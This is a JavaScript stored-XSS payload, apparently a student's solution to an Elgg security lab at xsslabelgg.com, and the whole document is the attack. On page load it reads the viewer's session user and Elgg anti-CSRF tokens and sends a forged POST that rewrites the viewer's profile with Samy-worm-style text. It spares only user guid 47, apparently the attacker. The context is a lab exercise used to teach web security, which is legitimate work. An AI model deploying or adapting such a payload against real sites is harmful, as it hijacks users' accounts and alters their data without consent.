<script type="text/javascript">

	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	

	// this var store all the info needed from current user
	var info = elgg.session.user



	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;

	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit" //FILL IN

	var content=`&__elgg_ts=${elgg.security.token.__elgg_ts}
				&__elgg_token=${elgg.security.token.__elgg_token}
				&accesslevel[briefdescription]=1
				&accesslevel[contactemail]=1
				&accesslevel[description]=1
				&accesslevel[interests]=1
				&accesslevel[location]=1
				&accesslevel[mobile]=1
				&accesslevel[phone]=1
				&accesslevel[skills]=1
				&accesslevel[twitter]=1
				&accesslevel[website]=1
				&briefdescription=Samy'r+jonno+pagol
				&contactemail	
				&description=My+std_ID+:+1605034
				&guid=${info.guid}
				&interests=Samy
				&location=Samy+r+mon
				&mobile	
				&name=${info.name}
				&phone	
				&skills	Samy+r+sathe+kotha+bola
				&twitter	
				&website	`; //FILL IN

	
	
	if(info.guid != 47)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
		}
	}

</script>